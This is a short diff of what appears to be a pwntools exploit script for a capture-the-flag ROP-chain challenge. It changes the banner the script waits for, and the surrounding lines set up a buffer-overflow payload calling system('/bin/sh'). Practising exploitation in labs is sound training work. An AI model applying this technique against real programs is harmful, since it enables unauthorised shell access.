@@ -13,7 +13,7 @@ ret        = next(elf.search(b'\xc3')) # 0x40101a
 system_plt = elf.plt['system']         # 0x401090
 binsh      = 0x402004                  # "/bin/sh" 字符串地址（.rodata）
 
-r.recvuntil(b'ok\n')
+r.recvuntil(b'=== SLsec Pwn: ROP Chain ===\n')
 
 # buf[0x20] + saved_rbp[8] = 0x28 padding
 payload  = b'A' * 0x28
